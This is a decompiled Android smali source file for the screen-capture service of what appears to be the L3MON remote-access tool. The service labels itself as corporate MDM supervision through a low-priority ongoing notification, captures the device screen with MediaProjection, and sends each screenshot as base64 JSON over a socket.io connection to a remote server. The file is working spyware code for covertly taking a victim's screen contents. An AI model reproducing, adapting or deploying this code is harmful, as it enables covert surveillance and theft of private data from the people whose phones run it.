.class public Lcom/etechd/l3mon/ScreenCaptureService;
.super Landroid/app/Service;
.source "ScreenCaptureService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "mdm_screen_capture"

.field private static final NOTIFICATION_ID:I = 0x2329


# instance fields
.field private imageReader:Landroid/media/ImageReader;

.field private mediaProjection:Landroid/media/projection/MediaProjection;

.field private virtualDisplay:Landroid/hardware/display/VirtualDisplay;


# direct methods
.method static bridge synthetic -$$Nest$fgetimageReader(Lcom/etechd/l3mon/ScreenCaptureService;)Landroid/media/ImageReader;
    .locals 0

    iget-object p0, p0, Lcom/etechd/l3mon/ScreenCaptureService;->imageReader:Landroid/media/ImageReader;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mcleanup(Lcom/etechd/l3mon/ScreenCaptureService;)V
    .locals 0

    invoke-direct {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->cleanup()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendToServer(Lcom/etechd/l3mon/ScreenCaptureService;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/etechd/l3mon/ScreenCaptureService;->sendToServer(Ljava/lang/String;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private buildNotification()Landroid/app/Notification;
    .locals 4

    .line 148
    nop

    .line 149
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Supervisi\u00c3\u00b3n Corporativa"

    const/4 v2, 0x2

    const-string v3, "mdm_screen_capture"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 154
    const-string v1, "Captura de pantalla corporativa activa"

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 155
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/ScreenCaptureService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 156
    if-eqz v1, :cond_0

    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 159
    :cond_0
    nop

    .line 160
    nop

    .line 161
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0, v3}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 166
    nop

    .line 167
    const-string v1, "Supervisi\u00c3\u00b3n MDM Activa"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 168
    const-string v1, "Captura de pantalla corporativa en progreso..."

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 169
    const v1, 0x1080037

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 170
    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 171
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 172
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 166
    return-object v0
.end method

.method private captureScreen(ILandroid/content/Intent;)V
    .locals 10

    .line 60
    nop

    .line 61
    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/ScreenCaptureService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    .line 63
    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->stopSelf()V

    return-void

    .line 65
    :cond_0
    invoke-virtual {v0, p1, p2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object p1

    iput-object p1, p0, Lcom/etechd/l3mon/ScreenCaptureService;->mediaProjection:Landroid/media/projection/MediaProjection;

    .line 66
    if-nez p1, :cond_1

    invoke-virtual {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->stopSelf()V

    return-void

    .line 68
    :cond_1
    const-string p1, "window"

    invoke-virtual {p0, p1}, Lcom/etechd/l3mon/ScreenCaptureService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/WindowManager;

    .line 69
    new-instance p2, Landroid/util/DisplayMetrics;

    invoke-direct {p2}, Landroid/util/DisplayMetrics;-><init>()V

    .line 70
    invoke-interface {p1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object p1

    invoke-virtual {p1, p2}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    .line 71
    iget p1, p2, Landroid/util/DisplayMetrics;->widthPixels:I

    .line 72
    iget v9, p2, Landroid/util/DisplayMetrics;->heightPixels:I

    .line 73
    iget v4, p2, Landroid/util/DisplayMetrics;->densityDpi:I

    .line 75
    const/4 p2, 0x1

    const/4 v0, 0x2

    invoke-static {p1, v9, p2, v0}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object p2

    iput-object p2, p0, Lcom/etechd/l3mon/ScreenCaptureService;->imageReader:Landroid/media/ImageReader;

    .line 77
    iget-object v0, p0, Lcom/etechd/l3mon/ScreenCaptureService;->mediaProjection:Landroid/media/projection/MediaProjection;

    const-string v1, "MDMCapture"

    const/16 v5, 0x10

    .line 81
    invoke-virtual {p2}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v6

    const/4 v7, 0x0

    const/4 v8, 0x0

    .line 77
    move v2, p1

    move v3, v9

    invoke-virtual/range {v0 .. v8}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object p2

    iput-object p2, p0, Lcom/etechd/l3mon/ScreenCaptureService;->virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    .line 85
    new-instance p2, Landroid/os/Handler;

    invoke-direct {p2}, Landroid/os/Handler;-><init>()V

    new-instance v0, Lcom/etechd/l3mon/ScreenCaptureService$1;

    invoke-direct {v0, p0, p1, v9}, Lcom/etechd/l3mon/ScreenCaptureService$1;-><init>(Lcom/etechd/l3mon/ScreenCaptureService;II)V

    const-wide/16 v1, 0x1f4

    invoke-virtual {p2, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 122
    return-void
.end method

.method private cleanup()V
    .locals 2

    .line 141
    iget-object v0, p0, Lcom/etechd/l3mon/ScreenCaptureService;->virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    iput-object v1, p0, Lcom/etechd/l3mon/ScreenCaptureService;->virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    .line 142
    :cond_0
    iget-object v0, p0, Lcom/etechd/l3mon/ScreenCaptureService;->imageReader:Landroid/media/ImageReader;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/media/ImageReader;->close()V

    iput-object v1, p0, Lcom/etechd/l3mon/ScreenCaptureService;->imageReader:Landroid/media/ImageReader;

    .line 143
    :cond_1
    iget-object v0, p0, Lcom/etechd/l3mon/ScreenCaptureService;->mediaProjection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    iput-object v1, p0, Lcom/etechd/l3mon/ScreenCaptureService;->mediaProjection:Landroid/media/projection/MediaProjection;

    .line 144
    :cond_2
    invoke-virtual {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->stopSelf()V

    .line 145
    return-void
.end method

.method private sendToServer(Ljava/lang/String;)V
    .locals 5

    .line 126
    :try_start_0
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    .line 127
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Lio/socket/client/Socket;->connected()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 128
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 129
    const-string v2, "type"

    const-string v3, "0xSC"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 130
    const-string v2, "imageBase64"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 131
    const-string v2, "timestamp"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 132
    const-string v2, "data"

    filled-new-array {v1}, [Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/client/Socket;

    .line 133
    const-string v0, "MDMCapture"

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Screenshot sent to server. Size: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v1, " chars"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 137
    :cond_0
    goto :goto_0

    .line 135
    :catch_0
    move-exception p1

    .line 136
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    .line 138
    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 176
    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 0

    .line 180
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 181
    invoke-direct {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->cleanup()V

    .line 182
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .line 40
    const/16 p2, 0x2329

    invoke-direct {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->buildNotification()Landroid/app/Notification;

    move-result-object p3

    invoke-virtual {p0, p2, p3}, Lcom/etechd/l3mon/ScreenCaptureService;->startForeground(ILandroid/app/Notification;)V

    .line 42
    const/4 p2, 0x2

    if-nez p1, :cond_0

    .line 43
    invoke-virtual {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->stopSelf()V

    .line 44
    return p2

    .line 47
    :cond_0
    const-string p3, "RESULT_CODE"

    const/4 v0, -0x1

    invoke-virtual {p1, p3, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p3

    .line 48
    const-string v1, "RESULT_DATA"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    .line 50
    if-eq p3, v0, :cond_2

    if-nez p1, :cond_1

    goto :goto_0

    .line 55
    :cond_1
    invoke-direct {p0, p3, p1}, Lcom/etechd/l3mon/ScreenCaptureService;->captureScreen(ILandroid/content/Intent;)V

    .line 56
    return p2

    .line 51
    :cond_2
    :goto_0
    invoke-virtual {p0}, Lcom/etechd/l3mon/ScreenCaptureService;->stopSelf()V

    .line 52
    return p2
.end method
